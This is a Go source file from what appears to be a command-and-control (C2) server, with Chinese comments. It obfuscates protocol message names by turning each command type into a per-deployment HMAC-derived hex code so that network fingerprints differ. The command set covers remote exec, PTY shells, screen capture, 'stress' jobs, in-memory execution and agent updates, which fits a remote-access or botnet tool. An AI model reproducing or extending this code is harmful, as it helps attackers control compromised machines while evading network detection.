package ws

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"sync"
)

// C2 协议混淆 — 与 agent/c2proto.go 完全对称
// 使用 HMAC-SHA256(sign_key, type) 派生 8 字符 hex 编码
// 每个部署的协议指纹完全不同

var (
	c2EncMap map[string]string
	c2DecMap map[string]string // 合并了 DB key + 空 key 两种解码表
	c2Once   sync.Once
)

var c2Types = []string{
	"exec", "pty_start", "pty_input", "pty_resize", "pty_close",
	"screen_start", "screen_stop", "stress_start", "stress_stop",
	"quick_cmd", "mem_exec", "update", "ping",
	"exec_result", "pty_started", "pty_output", "pty_exit",
	"screen_frame", "screen_error", "stress_progress", "stress_done",
	"quick_cmd_result", "mem_exec_result", "update_result", "pong",
}

func buildDecMap(key []byte) map[string]string {
	m := make(map[string]string, len(c2Types))
	for _, t := range c2Types {
		mac := hmac.New(sha256.New, key)
		mac.Write([]byte("c2|" + t))
		code := hex.EncodeToString(mac.Sum(nil))[:8]
		m[code] = t
	}
	return m
}

func InitC2Proto(signKey []byte) {
	c2Once.Do(func() {
		c2EncMap = make(map[string]string, len(c2Types))
		c2DecMap = make(map[string]string, len(c2Types)*2)

		// 用 DB key 构建编码表
		for _, t := range c2Types {
			mac := hmac.New(sha256.New, signKey)
			mac.Write([]byte("c2|" + t))
			code := hex.EncodeToString(mac.Sum(nil))[:8]
			c2EncMap[t] = code
			c2DecMap[code] = t
		}

		// 额外：用空 key 构建备用解码表（兼容 SIGN_KEY 为空的旧 agent）
		for code, t := range buildDecMap([]byte("")) {
			if _, exists := c2DecMap[code]; !exists {
				c2DecMap[code] = t
			}
		}
	})
}

func C2e(t string) string {
	if c, ok := c2EncMap[t]; ok {
		return c
	}
	return t
}

func C2d(code string) string {
	if t, ok := c2DecMap[code]; ok {
		return t
	}
	return code
}
